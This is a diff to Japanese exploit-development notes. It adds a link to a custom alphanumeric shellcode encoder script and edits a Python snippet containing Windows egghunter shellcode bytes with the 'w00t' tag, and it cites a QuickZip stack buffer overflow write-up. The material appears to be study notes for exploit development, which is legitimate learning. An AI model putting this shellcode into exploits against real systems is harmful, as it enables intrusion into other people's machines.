@@ -2684,6 +2684,7 @@ ASCIIでprint可能な`0x21~0x7f`で、それ以外の文字を置き換える�
 # 参考　https://www.offensive-security.com/vulndev/quickzip-stack-bof-0day-a-box-of-chocolates/
 ```
 この処理を自動化するスクリプトを作成した。なお、以下の文字はWindowsではファイル名に含められないため、これらを含まないようにEncodeする仕様となっている。微調整が必要な場合も、このスクリプトを基準にしたい。   
+[custom encoder](script/encoder-shellcode-alpha.py)   
 ```txt
 "  0x22    
 *  0x2a
@@ -2702,9 +2703,16 @@ ASCIIでprint可能な`0x21~0x7f`で、それ以外の文字を置き換える�
 ```python
 import struct
 
+################# User code begin ###################################################################
+# You should edit only this section
+
 egghunter = "\x31\xd2\x90\x90\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
-egghunter += "\x80\x81\x82\x83" # this is the marker/tag: w00t
+egghunter += "w00t" # this is the marker/tag: w00t
 egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
+
+# Make sure that finally using variable "shellcode"
+shellcode = egghunter
+################# User code end #####################################################################
 ```
 これを実行すると、以下のように表示される。
 ```txt
